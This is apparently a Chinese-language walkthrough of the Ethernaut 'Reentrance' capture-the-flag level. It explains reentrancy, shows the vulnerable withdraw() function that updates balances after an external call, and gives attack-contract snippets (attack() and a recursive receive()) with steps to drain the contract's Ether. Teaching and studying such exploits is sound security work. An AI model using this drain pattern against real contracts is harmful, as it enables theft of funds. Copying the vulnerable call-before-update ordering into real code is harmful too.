# Reentrance

## Reference
[Reentrance](https://ethernaut.openzeppelin.com/level/10)

[Reentrance.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/10-Reentrance/Reentrance.sol)

## 目标
1. 实施重入攻击，转走合约全部Ether

## 分析
### Reentrancy
重入攻击表示攻击合约可以递归的调用目标合约的函数
1. 需要有一个外部的`call`, `call`会新建一个新的虚拟机环境,重新读取的目标合约的状态数据
2. 存在一些状态的更新，状态更新发生在外部`call`之后，导致每次`call`的执行环境都会读取未发生更新的旧数据

### receive()
1. `receive()`函数作为接受Ether的被动执行函数，一旦有外部账户转账给合约地址，当前交易会 `call` 转账合约的 `receive或fallback`函数
2. `call()`转账会将目前剩余的gas全部发送到新的执行环境，允许新执行环境中进行一些外部操作
3. `transfer()/send()`仅发送2300gas用于转账，新的执行环境没有对于gas执行额外操作

### withdraw()
```solidity
    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
```
1. 退款函数中存在外部转账的`call()`方法
2. 转账地址的余额变化发生在`call`之后
3. 如果当前退款账户是合约地址的话，执行call退款会触发退款合约的`receive()`函数

### 攻击流程
1. 准备一个退款合约，合约作为sender执行donate函数
```solidity
    function attack() public payable {
        ret.donate{value: amount}(address(this));
        ret.withdraw(amount);
    }
```
2. 准备receive()函数，内部回调攻击合约，实现重入攻击
```solidity
    receive() external payable {
        if (address(ret).balance >= amount) {
            ret.withdraw(amount);
        }
    }
```

## 实现步骤
1. 部署攻击合约 `AtReentrance`，部署目标合约 `Reentrance`
2. 往攻击合约`AtReentrance`，存入Ether
3. 调用攻击合约`AtReentrance`的 `attack()`函数进行存款，在目标合约`Reentrance`中的 `balances` 不为空
4. 攻击合约存款后，立马进行退款。并且每次目标合约`Reentrance`的退款函数会涉及`call`转账，因此触发攻击合约的`receive()`函数
5. 在`receive()`函数中，攻击合约`AtReentrance`重新 `call` 目标合约 `Reentrance`的退款函数`withdraw()`
6. 在目标合约 `Reentrance`中，由于余额更新在外部`call`之后，因此所有新的虚拟机执行环境中仍然保留 `balance` 余额
7. 攻击合约持续多次退款，掏空目标合约余额
